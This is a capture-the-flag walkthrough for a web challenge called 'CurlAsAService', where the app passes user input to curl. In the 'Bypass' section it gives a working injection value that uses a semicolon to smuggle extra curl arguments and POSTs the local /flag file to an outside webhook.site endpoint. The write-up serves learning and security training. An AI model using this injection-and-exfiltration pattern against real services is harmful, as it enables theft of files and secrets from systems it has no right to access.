# Web - CurlAsAService

## Description
> cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.

## Walkthrough

For this web challenge, we had an online instance and the challenge code.

I first looked at the website normally in browser.

![Screenshot0](./screenshots/0.png)

We see this page __Health Checker 9000__ which is probably meant to check if a service / website is active.

The whole thing is apparently done with `curl`.

Brought to the preset URL `http://127.0.0.1` we get to see the following.

![Screenshot1](./screenshots/1.png)

Now we have retrieved our own page internally on the localhost.

External page calls also work as demonstrated here with `http://example.org`.

![Screenshot2](./screenshots/2.png)

Ok, so far so good, but we want the flag.

Let's first see where it is in the challenge files.

`tree web_caas`

![Screenshot3](./screenshots/3.png)

The flag is located in a file under `/flag`.

<br>
<br>

## Bypass

I experimented a bit with the application and tried to find a bypass.

Some attempts failed and I got __Illegal Characters Detected__ as output only.

![Screenshot4](./screenshots/4.png)

I also tried to change curls protocols like `ftp://`, `file://` and so on, but this did not work.

With a seimicolon `;` I found a bypass that worked.

__Bypass:__ `http://no.local/ ; https://webhook.site/<ID> -d @/flag`.

I was able to do the query twice with a semicolon using curl and was able to send the flag `-d` and the `@` character files via POST and sent the flag to me to [webhook.site](https://webhook.site).

![Screenshot5](./screenshots/5.png)

![Screenshot6](./screenshots/6.png)
